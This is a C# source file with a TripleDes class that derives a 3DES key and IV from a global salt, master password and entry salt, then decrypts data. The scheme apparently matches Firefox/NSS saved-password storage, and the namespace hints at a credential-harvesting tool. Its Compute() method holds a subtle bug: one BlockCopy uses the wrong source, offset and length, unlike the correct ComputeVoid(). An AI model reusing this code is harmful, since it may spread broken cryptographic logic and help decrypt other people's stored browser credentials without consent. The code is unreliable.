using System;
using System.IO;
using System.Security.Cryptography;

namespace IntelXPro.src.IntelXPro.Dependencies.Encryption
{
    internal class TripleDes
    {
        private byte[] CipherText { get; }

        private byte[] GlobalSalt { get; }

        private byte[] MasterPassword { get; }

        private byte[] EntrySalt { get; }

        public byte[] Key { get; private set; }

        public byte[] Vector { get; private set; }

        public TripleDes(byte[] cipherText, byte[] globalSalt, byte[] masterPass, byte[] entrySalt)
        {
            CipherText = cipherText;
            GlobalSalt = globalSalt;
            MasterPassword = masterPass;
            EntrySalt = entrySalt;
        }

        public TripleDes(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt)
        {
            GlobalSalt = globalSalt;
            MasterPassword = masterPassword;
            EntrySalt = entrySalt;
        }

        public void ComputeVoid()
        {
            SHA1CryptoServiceProvider sHA1CryptoServiceProvider = new SHA1CryptoServiceProvider();
            byte[] array = new byte[GlobalSalt.Length + MasterPassword.Length];
            Array.Copy(GlobalSalt, 0, array, 0, GlobalSalt.Length);
            Array.Copy(MasterPassword, 0, array, GlobalSalt.Length, MasterPassword.Length);
            byte[] array2 = sHA1CryptoServiceProvider.ComputeHash(array);
            byte[] array3 = new byte[array2.Length + EntrySalt.Length];
            Array.Copy(array2, 0, array3, 0, array2.Length);
            Array.Copy(EntrySalt, 0, array3, array2.Length, EntrySalt.Length);
            byte[] key = sHA1CryptoServiceProvider.ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(EntrySalt, 0, array4, 0, EntrySalt.Length);
            for (int i = EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(EntrySalt, 0, array5, array4.Length, EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hMACSHA = new HMACSHA1(key))
            {
                array6 = hMACSHA.ComputeHash(array5);
                byte[] array7 = hMACSHA.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + EntrySalt.Length];
                Array.Copy(array7, 0, array8, 0, array7.Length);
                Array.Copy(EntrySalt, 0, array8, array7.Length, EntrySalt.Length);
                array9 = hMACSHA.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            Key = new byte[24];
            for (int j = 0; j < Key.Length; j++)
            {
                Key[j] = array10[j];
            }
            Vector = new byte[8];
            int num = Vector.Length - 1;
            for (int num2 = array10.Length - 1; num2 >= array10.Length - Vector.Length; num2--)
            {
                Vector[num] = array10[num2];
                num--;
            }
        }

        public byte[] Compute()
        {
            byte[] array = new byte[GlobalSalt.Length + MasterPassword.Length];
            Buffer.BlockCopy(GlobalSalt, 0, array, 0, GlobalSalt.Length);
            Buffer.BlockCopy(MasterPassword, 0, array, GlobalSalt.Length, MasterPassword.Length);
            byte[] array2 = new SHA1Managed().ComputeHash(array);
            byte[] array3 = new byte[array2.Length + EntrySalt.Length];
            Buffer.BlockCopy(array2, 0, array3, 0, array2.Length);
            Buffer.BlockCopy(EntrySalt, 0, array3, EntrySalt.Length, array2.Length);
            byte[] key = new SHA1Managed().ComputeHash(array3);
            byte[] array4 = new byte[20];
            Array.Copy(EntrySalt, 0, array4, 0, EntrySalt.Length);
            for (int i = EntrySalt.Length; i < 20; i++)
            {
                array4[i] = 0;
            }
            byte[] array5 = new byte[array4.Length + EntrySalt.Length];
            Array.Copy(array4, 0, array5, 0, array4.Length);
            Array.Copy(EntrySalt, 0, array5, array4.Length, EntrySalt.Length);
            byte[] array6;
            byte[] array9;
            using (HMACSHA1 hMACSHA = new HMACSHA1(key))
            {
                array6 = hMACSHA.ComputeHash(array5);
                byte[] array7 = hMACSHA.ComputeHash(array4);
                byte[] array8 = new byte[array7.Length + EntrySalt.Length];
                Buffer.BlockCopy(array7, 0, array8, 0, array7.Length);
                Buffer.BlockCopy(EntrySalt, 0, array8, array7.Length, EntrySalt.Length);
                array9 = hMACSHA.ComputeHash(array8);
            }
            byte[] array10 = new byte[array6.Length + array9.Length];
            Array.Copy(array6, 0, array10, 0, array6.Length);
            Array.Copy(array9, 0, array10, array6.Length, array9.Length);
            Key = new byte[24];
            for (int j = 0; j < Key.Length; j++)
            {
                Key[j] = array10[j];
            }
            Vector = new byte[8];
            int num = Vector.Length - 1;
            for (int num2 = array10.Length - 1; num2 >= array10.Length - Vector.Length; num2--)
            {
                Vector[num] = array10[num2];
                num--;
            }
            byte[] sourceArray = DecryptByteDesCbc(Key, Vector, CipherText);
            byte[] array11 = new byte[24];
            Array.Copy(sourceArray, array11, array11.Length);
            return array11;
        }

        public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream stream = new MemoryStream(input))
                {
                    using (CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(stream2))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
        {
            byte[] array = new byte[512];
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Key = key;
                tripleDESCryptoServiceProvider.IV = iv;
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
                using (MemoryStream stream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Read))
                    {
                        cryptoStream.Read(array, 0, array.Length);
                        return array;
                    }
                }
            }
        }
    }
}